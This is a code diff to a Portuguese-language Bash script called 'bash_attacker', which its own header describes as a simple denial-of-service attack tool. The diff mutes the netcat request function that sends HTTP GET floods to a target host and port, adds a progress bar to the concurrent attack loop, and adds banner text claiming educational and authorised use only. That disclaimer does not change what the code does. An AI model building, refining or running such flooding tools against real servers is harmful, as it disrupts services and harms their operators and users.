@@ -3,7 +3,7 @@
 # Nome: bash_attacker
 # Autor: Erik Castro
 # Data de Criação: 08/10/2024
-# Data de modificação: 09/10/2024
+# Data de modificação: 11/10/2024
 # Decription: Simples script de ataque de negação de
 # serviço.
 # Versão: 0.0.1-alpha
@@ -101,7 +101,7 @@ exibe_hist() {
 requisitar() {
     local host=$1
     local port=$2
-    echo -ne "GET / HTTP/1.1\r\nHost: $host\r\n\r\n" | nc -vq 1 $host $port
+    echo -ne "GET / HTTP/1.1\r\nHost: $host\r\n\r\n" | nc -vq 1 $host $port &>/dev/null
 }
 
 # Valida se ip é valido (IPv4)
@@ -127,6 +127,30 @@ validar_host() {
     else
         return 1
     fi
+}
+
+# Função que exibe a barra de progresso
+progress_bar() {
+    local current=$1     # Valor atual do progresso
+    local width=${2:-30} # Largura da barra de progresso (valor padrão 50)
+    local total=$3       # Valor total a ser atingido
+
+    # Calcula a porcentagem de progresso
+    local progress=$(( current * 100 / total ))
+    
+    # Calcula a quantidade de "#" (completado) e "-" (restante)
+    local done=$((progress * width / 100))
+    local left=$((width - done))
+
+    # Cores da barra
+    local YELLOW="\x1b[33m"
+    local RESET="\x1b[0m"
+
+    # Gera a barra de progresso com tamanho fixo
+    printf "["
+    printf "${YELLOW}%0.s#" $(seq 1 $done)    # Imprime os símbolos "#" (completado)
+    printf "%0.s " $(seq 1 $left)    # Imprime os símbolos "-" (restante)
+    printf "${RESET}] %3d%% (%d/%d)\r" $progress $current $total  # Imprime a porcentagem e o progresso atual
 }
 
 # valida a entrada de paramêtros
@@ -197,28 +221,34 @@ ataque(){
           wait -n # Espera até que uma termine
 	  ((controle--))
        fi
+       progress_bar $SECONDS 30 $t_final
     done
+    echo
 }
 
 banner_fn() {
     # Definição de cores
     local RED="\033[1;31m"
+    local YELLOW="\033[1;33m"
     local GREEN="\033[1;32m"
     local RST="\033[0m"
 
     # Título do banner
     local BANNER_TITLE="Bash Attacker"
-    local WARNING_MSG="Atenção! Você é totalmente responsável pelo uso deste software."
+    local WARNING_MSG="AVISO: Uso desta ferramenta apenas para fins educativos e ambientes autorizados."
+    local RESPONSIBILITY_MSG="Você é totalmente responsável por qualquer ação realizada com este software."
 
     # Verificação se 'figlet' e 'lolcat' estão instalados
     if command -v figlet >/dev/null 2>&1 && command -v lolcat >/dev/null 2>&1; then
         # Exibe o banner colorido com figlet e lolcat
         figlet -tcf smpoison "$BANNER_TITLE" | lolcat
-        echo -e "${RED}\t$WARNING_MSG${RST}" | lolcat
+        echo -e "${RED}$WARNING_MSG${RST}" | lolcat
+        echo -e "${YELLOW}$RESPONSIBILITY_MSG${RST}" | lolcat
     else
         # Caso figlet ou lolcat não estejam instalados, exibe um banner simples
         echo -e "${GREEN}========= $BANNER_TITLE =========${RST}"
         echo -e "${RED}$WARNING_MSG${RST}"
+        echo -e "${YELLOW}$RESPONSIBILITY_MSG${RST}"
     fi
 
     echo # Adiciona uma linha em branco
